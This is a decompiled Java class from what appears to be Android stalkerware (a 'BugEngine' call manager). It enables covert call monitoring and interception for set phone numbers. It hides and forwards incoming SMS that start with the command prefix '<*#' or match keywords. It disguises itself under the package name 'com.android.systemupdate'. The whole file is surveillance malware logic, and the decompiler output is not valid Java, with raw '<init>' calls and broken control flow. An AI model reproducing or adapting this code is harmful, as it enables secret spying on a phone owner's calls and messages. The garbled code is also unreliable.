package com.vvt.callmanager.ref;

import com.fx.socket.SocketCmd;
import com.fx.socket.b;
import com.vvt.base.RunningMode;
import com.vvt.base.communication.SmsInterceptInfo;
import com.vvt.base.communication.SmsInterceptInfo.InterceptionMethod;
import com.vvt.base.communication.SmsInterceptInfo.KeywordFindingMethod;
import com.vvt.callmanager.ref.command.RemoteAddMonitor;
import com.vvt.callmanager.ref.command.RemoteAddSmsIntercept;
import com.vvt.callmanager.ref.command.RemoteForwardInterceptingSms;
import com.vvt.callmanager.ref.command.RemoteListenBugNotification;
import com.vvt.callmanager.ref.command.RemoteNotifyOnCallActive;
import com.vvt.callmanager.ref.command.RemoteNotifyOnCallStateChanged;
import com.vvt.callmanager.ref.command.RemoteNotifyOnMonitorDisconnect;
import com.vvt.callmanager.ref.command.RemotePurgePendingSmsCommands;
import com.vvt.callmanager.ref.command.RemoteRemoveAllMonitor;
import com.vvt.callmanager.ref.command.RemoteRemoveAllSmsIntercept;
import com.vvt.sms.SmsInfo;
import java.io.IOException;
import java.util.Iterator;
import java.util.List;

public class e
  implements com.fx.socket.a
{
  private static final boolean a = j.b;
  private static final boolean b = j.e;
  private com.vvt.base.communication.a c;
  private k d;
  private b e;
  private BugNotification f;
  private List g;
  private RunningMode h;
  
  public e(RunningMode paramRunningMode, com.vvt.base.communication.a parama)
  {
    this.h = paramRunningMode;
    this.c = parama;
    Object localObject1 = new com/vvt/callmanager/ref/BugNotification;
    Object localObject2 = "vvt.callmanager";
    ((BugNotification)localObject1).<init>((String)localObject2);
    this.f = ((BugNotification)localObject1);
    localObject1 = RunningMode.FULL;
    if (paramRunningMode == localObject1) {
      e();
    }
    for (;;)
    {
      return;
      localObject1 = new com/vvt/callmanager/ref/k;
      ((k)localObject1).<init>();
      this.d = ((k)localObject1);
      localObject1 = this.d;
      localObject2 = d();
      ((k)localObject1).a((com.vvt.base.communication.a)localObject2);
    }
  }
  
  private void a(Object paramObject)
  {
    Object localObject = this.c;
    if (localObject != null)
    {
      localObject = new com/vvt/callmanager/ref/g;
      ((g)localObject).<init>(this, paramObject);
      ((h)localObject).start();
    }
  }
  
  private com.vvt.base.communication.a d()
  {
    f localf = new com/vvt/callmanager/ref/f;
    localf.<init>(this);
    return localf;
  }
  
  private void e()
  {
    boolean bool = a;
    if (bool) {}
    b localb = this.e;
    if (localb != null)
    {
      bool = a;
      if (bool) {}
      localb = this.e;
      localb.a();
    }
    bool = a;
    if (bool) {}
    localb = new com/fx/socket/b;
    localb.<init>("BugEngine", "vvt.callmanager", this);
    this.e = localb;
    this.e.start();
  }
  
  public Object a(SocketCmd paramSocketCmd)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object localObject = null;
    boolean bool3 = paramSocketCmd instanceof RemoteForwardInterceptingSms;
    Boolean localBoolean;
    if (bool3)
    {
      bool2 = a;
      if (bool2) {}
      localBoolean = Boolean.valueOf(bool1);
      paramSocketCmd = (RemoteForwardInterceptingSms)paramSocketCmd;
      localObject = (SmsInfo)paramSocketCmd.getData();
      a(localObject);
      localObject = localBoolean;
    }
    for (;;)
    {
      return localObject;
      bool3 = paramSocketCmd instanceof RemoteNotifyOnCallActive;
      if (bool3)
      {
        bool2 = a;
        if (bool2) {}
        localBoolean = Boolean.valueOf(bool1);
        paramSocketCmd = (RemoteNotifyOnCallActive)paramSocketCmd;
        localObject = (ActiveCallInfo)paramSocketCmd.getData();
        a(localObject);
        localObject = localBoolean;
      }
      else
      {
        bool3 = paramSocketCmd instanceof RemoteNotifyOnMonitorDisconnect;
        if (bool3)
        {
          bool2 = a;
          if (bool2) {}
          localBoolean = Boolean.valueOf(bool1);
          paramSocketCmd = (RemoteNotifyOnMonitorDisconnect)paramSocketCmd;
          localObject = (MonitorDisconnectData)paramSocketCmd.getData();
          a(localObject);
          localObject = localBoolean;
        }
        else
        {
          bool3 = paramSocketCmd instanceof RemoteNotifyOnCallStateChanged;
          if (bool3)
          {
            bool2 = a;
            if (bool2) {}
            localBoolean = Boolean.valueOf(bool1);
            paramSocketCmd = (RemoteNotifyOnCallStateChanged)paramSocketCmd;
            localObject = (BugEngineCallState)paramSocketCmd.getData();
            a(localObject);
            localObject = localBoolean;
          }
        }
      }
    }
  }
  
  public void a()
  {
    b localb = this.e;
    if (localb != null)
    {
      localb = this.e;
      localb.a();
    }
  }
  
  public void a(List paramList)
  {
    this.g = paramList;
  }
  
  public void a(boolean paramBoolean)
  {
    Object localObject1 = this.h;
    Object localObject2 = RunningMode.FULL;
    boolean bool;
    if (localObject1 != localObject2)
    {
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      return;
      this.f.setListenOnMonitorDisconnect(paramBoolean);
      localObject1 = new com/vvt/callmanager/ref/command/RemoteListenBugNotification;
      localObject2 = this.f;
      ((RemoteListenBugNotification)localObject1).<init>((BugNotification)localObject2);
      try
      {
        ((RemoteListenBugNotification)localObject1).execute();
      }
      catch (IOException localIOException)
      {
        bool = b;
      }
      if (!bool) {}
    }
  }
  
  public void a(boolean paramBoolean1, boolean paramBoolean2)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = this.h;
    Object localObject2 = RunningMode.FULL;
    if (localObject1 != localObject2)
    {
      bool1 = a;
      if (!bool1) {}
    }
    for (;;)
    {
      return;
      bool1 = a;
      if (bool1) {}
      localObject1 = new com/vvt/callmanager/ref/command/RemoteRemoveAllMonitor;
      localObject2 = "com.android.systemupdate";
      ((RemoteRemoveAllMonitor)localObject1).<init>((String)localObject2);
      boolean bool2;
      try
      {
        ((RemoteRemoveAllMonitor)localObject1).execute();
        if ((paramBoolean1) || (paramBoolean2))
        {
          localObject1 = this.g;
          if (localObject1 != null)
          {
            localObject1 = this.g;
            int i = ((List)localObject1).size();
            if (i > 0)
            {
              bool2 = a;
              if (bool2) {}
              localObject1 = this.g;
              localObject2 = ((List)localObject1).iterator();
              for (;;)
              {
                bool2 = ((Iterator)localObject2).hasNext();
                if (bool2)
                {
                  localObject1 = (String)((Iterator)localObject2).next();
                  MonitorNumber localMonitorNumber = new com/vvt/callmanager/ref/MonitorNumber;
                  localMonitorNumber.<init>();
                  String str = "com.android.systemupdate";
                  localMonitorNumber.setOwnerPackage(str);
                  localMonitorNumber.setPhoneNumber((String)localObject1);
                  bool2 = true;
                  localMonitorNumber.setEnabled(bool2);
                  localMonitorNumber.setSpyEnabled(paramBoolean1);
                  localMonitorNumber.setCallInterceptEnabled(paramBoolean2);
                  localObject1 = new com/vvt/callmanager/ref/command/RemoteAddMonitor;
                  ((RemoteAddMonitor)localObject1).<init>(localMonitorNumber);
                  try
                  {
                    ((RemoteAddMonitor)localObject1).execute();
                  }
                  catch (IOException localIOException1)
                  {
                    bool2 = b;
                    if (bool2) {}
                    BugEngineException localBugEngineException1 = new com/vvt/callmanager/ref/BugEngineException;
                    localBugEngineException1.<init>("Socket communication failed");
                    throw localBugEngineException1;
                  }
                }
              }
            }
          }
        }
        BugEngineException localBugEngineException2;
        bool2 = a;
      }
      catch (IOException localIOException2)
      {
        bool2 = b;
        if (bool2) {}
        localBugEngineException2 = new com/vvt/callmanager/ref/BugEngineException;
        localBugEngineException2.<init>("Socket communication failed");
        throw localBugEngineException2;
      }
      if (!bool2) {}
    }
  }
  
  public void b()
  {
    SmsInterceptInfo localSmsInterceptInfo = new com/vvt/base/communication/SmsInterceptInfo;
    localSmsInterceptInfo.<init>();
    localSmsInterceptInfo.setOwnerPackage("com.android.systemupdate");
    Object localObject = SmsInterceptInfo.InterceptionMethod.HIDE_AND_FORWARD;
    localSmsInterceptInfo.setInterceptionMethod((SmsInterceptInfo.InterceptionMethod)localObject);
    localObject = SmsInterceptInfo.KeywordFindingMethod.START_WITH;
    localSmsInterceptInfo.setKeywordFindingMethod((SmsInterceptInfo.KeywordFindingMethod)localObject);
    localSmsInterceptInfo.setKeyword("<*#");
    localObject = this.h;
    RunningMode localRunningMode = RunningMode.FULL;
    if (localObject == localRunningMode)
    {
      localSmsInterceptInfo.setOwnerPackage("vvt.callmanager");
      localSmsInterceptInfo.setClientSocketName("vvt.callmanager");
      localObject = new com/vvt/callmanager/ref/command/RemoteAddSmsIntercept;
      ((RemoteAddSmsIntercept)localObject).<init>(localSmsInterceptInfo);
    }
    for (;;)
    {
      BugEngineException localBugEngineException;
      try
      {
        ((RemoteAddSmsIntercept)localObject).execute();
        return;
      }
      catch (IOException localIOException)
      {
        boolean bool = b;
        if (bool) {}
        localBugEngineException = new com/vvt/callmanager/ref/BugEngineException;
        localBugEngineException.<init>("Socket communication failed");
        throw localBugEngineException;
      }
      localObject = i.a();
      ((i)localObject).a(localBugEngineException);
    }
  }
  
  public void b(List paramList)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    int i = 2;
    Object localObject1 = new Object[i];
    localObject1[0] = "com.android.systemupdate";
    int j = 1;
    Object localObject2 = "MONITOR_KEYWORDS";
    localObject1[j] = localObject2;
    localObject1 = String.format("%s.%s", (Object[])localObject1);
    Object localObject3 = this.h;
    Object localObject5 = RunningMode.FULL;
    if (localObject3 == localObject5)
    {
      localObject3 = new com/vvt/callmanager/ref/command/RemoteRemoveAllSmsIntercept;
      ((RemoteRemoveAllSmsIntercept)localObject3).<init>((String)localObject1);
    }
    for (;;)
    {
      try
      {
        ((RemoteRemoveAllSmsIntercept)localObject3).execute();
        bool = a;
        if (bool) {}
        bool = a;
        if (bool) {}
        localObject5 = paramList.iterator();
        bool = ((Iterator)localObject5).hasNext();
        if (!bool) {
          break;
        }
        localObject3 = (String)((Iterator)localObject5).next();
        localObject2 = new com/vvt/base/communication/SmsInterceptInfo;
        ((SmsInterceptInfo)localObject2).<init>();
        Object localObject6 = SmsInterceptInfo.InterceptionMethod.HIDE_ONLY;
        ((SmsInterceptInfo)localObject2).setInterceptionMethod((SmsInterceptInfo.InterceptionMethod)localObject6);
        localObject6 = SmsInterceptInfo.KeywordFindingMethod.CONTAINS_PHONE_NUMBER;
        ((SmsInterceptInfo)localObject2).setKeywordFindingMethod((SmsInterceptInfo.KeywordFindingMethod)localObject6);
        ((SmsInterceptInfo)localObject2).setKeyword((String)localObject3);
        ((SmsInterceptInfo)localObject2).setOwnerPackage((String)localObject1);
        localObject3 = this.h;
        localObject6 = RunningMode.FULL;
        if (localObject3 != localObject6) {
          break label297;
        }
        ((SmsInterceptInfo)localObject2).setClientSocketName("vvt.callmanager");
        localObject3 = new com/vvt/callmanager/ref/command/RemoteAddSmsIntercept;
        ((RemoteAddSmsIntercept)localObject3).<init>((SmsInterceptInfo)localObject2);
        try
        {
          ((RemoteAddSmsIntercept)localObject3).execute();
        }
        catch (IOException localIOException1)
        {
          bool = b;
          if (bool) {}
          BugEngineException localBugEngineException = new com/vvt/callmanager/ref/BugEngineException;
          localBugEngineException.<init>("Socket communication failed");
          throw localBugEngineException;
        }
        localObject4 = i.a();
      }
      catch (IOException localIOException2)
      {
        bool = b;
        if (bool) {}
        localObject4 = new com/vvt/callmanager/ref/BugEngineException;
        ((BugEngineException)localObject4).<init>("Socket communication failed");
        throw ((Throwable)localObject4);
      }
      ((i)localObject4).a((String)localObject1);
      continue;
      label297:
      Object localObject4 = i.a();
      ((i)localObject4).a((SmsInterceptInfo)localObject2);
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(boolean paramBoolean)
  {
    Object localObject1 = this.h;
    Object localObject2 = RunningMode.FULL;
    boolean bool;
    if (localObject1 != localObject2)
    {
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      return;
      this.f.setListenOnCallActive(paramBoolean);
      localObject1 = new com/vvt/callmanager/ref/command/RemoteListenBugNotification;
      localObject2 = this.f;
      ((RemoteListenBugNotification)localObject1).<init>((BugNotification)localObject2);
      try
      {
        ((RemoteListenBugNotification)localObject1).execute();
      }
      catch (IOException localIOException)
      {
        bool = b;
      }
      if (!bool) {}
    }
  }
  
  public void c()
  {
    Object localObject = this.h;
    RunningMode localRunningMode = RunningMode.FULL;
    if (localObject == localRunningMode)
    {
      localObject = new com/vvt/callmanager/ref/command/RemotePurgePendingSmsCommands;
      ((RemotePurgePendingSmsCommands)localObject).<init>();
    }
    try
    {
      ((RemotePurgePendingSmsCommands)localObject).execute();
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public void c(List paramList)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    int i = 2;
    Object localObject1 = new Object[i];
    localObject1[0] = "com.android.systemupdate";
    int j = 1;
    Object localObject2 = "KEYWORD";
    localObject1[j] = localObject2;
    localObject1 = String.format("%s.%s", (Object[])localObject1);
    Object localObject3 = this.h;
    Object localObject5 = RunningMode.FULL;
    if (localObject3 == localObject5)
    {
      localObject3 = new com/vvt/callmanager/ref/command/RemoteRemoveAllSmsIntercept;
      ((RemoteRemoveAllSmsIntercept)localObject3).<init>((String)localObject1);
    }
    for (;;)
    {
      try
      {
        ((RemoteRemoveAllSmsIntercept)localObject3).execute();
        bool = a;
        if (bool) {}
        localObject5 = paramList.iterator();
        bool = ((Iterator)localObject5).hasNext();
        if (!bool) {
          break;
        }
        localObject3 = (String)((Iterator)localObject5).next();
        localObject2 = new com/vvt/base/communication/SmsInterceptInfo;
        ((SmsInterceptInfo)localObject2).<init>();
        Object localObject6 = SmsInterceptInfo.InterceptionMethod.HIDE_ONLY;
        ((SmsInterceptInfo)localObject2).setInterceptionMethod((SmsInterceptInfo.InterceptionMethod)localObject6);
        localObject6 = SmsInterceptInfo.KeywordFindingMethod.CONTAINS;
        ((SmsInterceptInfo)localObject2).setKeywordFindingMethod((SmsInterceptInfo.KeywordFindingMethod)localObject6);
        ((SmsInterceptInfo)localObject2).setKeyword((String)localObject3);
        ((SmsInterceptInfo)localObject2).setOwnerPackage((String)localObject1);
        localObject3 = this.h;
        localObject6 = RunningMode.FULL;
        if (localObject3 != localObject6) {
          break label290;
        }
        ((SmsInterceptInfo)localObject2).setClientSocketName("vvt.callmanager");
        localObject3 = new com/vvt/callmanager/ref/command/RemoteAddSmsIntercept;
        ((RemoteAddSmsIntercept)localObject3).<init>((SmsInterceptInfo)localObject2);
        try
        {
          ((RemoteAddSmsIntercept)localObject3).execute();
        }
        catch (IOException localIOException1)
        {
          bool = b;
          if (bool) {}
          BugEngineException localBugEngineException = new com/vvt/callmanager/ref/BugEngineException;
          localBugEngineException.<init>("Socket communication failed");
          throw localBugEngineException;
        }
        localObject4 = i.a();
      }
      catch (IOException localIOException2)
      {
        bool = b;
        if (bool) {}
        localObject4 = new com/vvt/callmanager/ref/BugEngineException;
        ((BugEngineException)localObject4).<init>("Socket communication failed");
        throw ((Throwable)localObject4);
      }
      ((i)localObject4).a((String)localObject1);
      continue;
      label290:
      Object localObject4 = i.a();
      ((i)localObject4).a((SmsInterceptInfo)localObject2);
    }
    bool = a;
    if (bool) {}
  }
  
  public void c(boolean paramBoolean)
  {
    Object localObject1 = this.h;
    Object localObject2 = RunningMode.FULL;
    boolean bool;
    if (localObject1 != localObject2)
    {
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      return;
      this.f.setListenOnCallState(paramBoolean);
      localObject1 = new com/vvt/callmanager/ref/command/RemoteListenBugNotification;
      localObject2 = this.f;
      ((RemoteListenBugNotification)localObject1).<init>((BugNotification)localObject2);
      try
      {
        ((RemoteListenBugNotification)localObject1).execute();
      }
      catch (IOException localIOException)
      {
        bool = b;
      }
      if (!bool) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */